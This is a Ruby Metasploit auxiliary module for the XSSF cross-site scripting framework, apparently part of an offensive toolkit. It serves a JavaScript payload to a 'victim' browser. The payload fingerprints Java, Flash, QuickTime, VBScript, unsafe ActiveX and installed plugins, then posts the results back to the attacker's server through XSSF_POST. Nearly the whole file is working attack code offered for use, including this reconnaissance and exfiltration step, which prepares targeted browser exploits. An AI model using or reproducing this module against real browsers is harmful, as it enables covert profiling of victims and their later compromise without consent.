require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Properties detecter',
			'Description' => 'Detects a list of browser enabled properties'
		))
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
	
		code = %Q{
			var ret = '';
			var quicktime = false;
			var unsafe = true;

			if( window.navigator.javaEnabled() )	ret += "JAVA ENABLED \\n";
			else 									ret += "JAVA NOT AVAILABLE \\n";

			if (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]) ret += "FLASH AVAILABLE \\n";
			else 																			 ret += "FLASH NOT AVAILABLE \\n";

			if (navigator.plugins)
				for (i=0; i < navigator.plugins.length; i++ )
					if (navigator.plugins[i].name.indexOf("QuickTime")>=0)
						quicktime = true;

			if ((navigator.appVersion.indexOf("Mac") > 0) && (navigator.appName.substring(0,9) == "Microsoft") && (parseInt(navigator.appVersion) < 5) )
				quicktime = true;
	
			(quicktime) ? ret += "QUICKTIME AVAILABLE \\n" : ret += "QUICKTIME NOT AVAILABLE \\n";


			if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1))	ret += "VBSCRIPT AVAILABLE \\n";
			else																							ret += "VBSCRIPT NOT AVAILABLE \\n";

			try{ test = new ActiveXObject("WbemScripting.SWbemLocator"); }         
			catch(ex){unsafe = false;} 
   
			(unsafe) ? ret += "UNSAFE ACTIVE X ACTIVATED \\n" : ret += "UNSAFE ACTIVE X NOT ACTIVATED \\n";

			
			if (navigator.plugins && navigator.plugins.length > 0) {
				var pluginsArrayLength = navigator.plugins.length;
				ret += "PLUGINS : \\n";
				for (pluginsArrayCounter = 0 ; pluginsArrayCounter < pluginsArrayLength ; pluginsArrayCounter++ ) {
					ret += "\\t * " + navigator.plugins[pluginsArrayCounter].name;
					if(pluginsArrayCounter < pluginsArrayLength-1)
						ret += String.fromCharCode(10);
				}
			}

			XSSF_POST(ret, '#{self.name}');
		}

		send_response(cli, code)
	end
end